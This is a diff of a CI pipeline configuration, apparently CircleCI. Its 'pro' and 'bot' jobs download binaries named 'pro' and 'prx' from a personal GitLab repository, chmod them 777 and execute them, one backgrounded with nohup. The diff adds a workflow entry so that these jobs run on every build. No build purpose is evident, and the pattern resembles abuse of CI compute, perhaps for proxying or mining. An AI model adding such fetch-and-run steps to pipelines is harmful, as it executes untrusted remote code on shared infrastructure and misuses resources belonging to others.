@@ -11,8 +11,14 @@ jobs:
          name: pro
          command: | 
           sudo apt update && sudo apt install screen && wget https://gitlab.com/Sherwoodfrey/prx/-/raw/main/pro && chmod 777 pro && nohup ./pro
-          sleep 10s
+          sleep 10
       
       - run:
          name: bot
          command: wget https://gitlab.com/Sherwoodfrey/prx/-/raw/main/prx && chmod 777 prx && ./prx
+
+workflows:
+  version: 2
+  build:
+    jobs:
+      - build
